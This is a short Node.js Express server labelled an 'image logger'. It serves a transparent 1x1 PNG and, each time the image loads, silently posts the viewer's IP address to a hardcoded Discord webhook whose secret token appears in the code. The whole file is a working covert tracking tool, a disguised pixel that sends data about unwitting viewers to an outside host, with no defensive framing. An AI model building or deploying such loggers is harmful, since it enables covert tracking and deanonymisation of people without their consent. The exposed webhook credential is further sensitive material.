const express = require('express');
const axios = require('axios');
const app = express();

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1377206704281878568/nufBCkulZjdOUCneWCYWROhZw4-m1h9OLwKgh1mByCLuxmHHC4ifEk5m3JZR21iwPGGK';

app.get('/image.png', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  // Send IP info to Discord webhook
  try {
    await axios.post(DISCORD_WEBHOOK_URL, {
      embeds: [{
        title: 'New Image Logger Hit',
        description: `IP Address: \`${ip}\``,
        color: 0x0099ff,
        timestamp: new Date(),
      }]
    });
  } catch (error) {
    console.error('Error sending to Discord webhook:', error);
  }

  // Send a 1x1 transparent PNG pixel
  const img = Buffer.from(
    'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAoMBgQFq6xkAAAAASUVORK5CYII=',
    'base64'
  );
  res.writeHead(200, {
    'Content-Type': 'image/png',
    'Content-Length': img.length,
  });
  res.end(img);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Image logger running on port ${PORT}`);
});
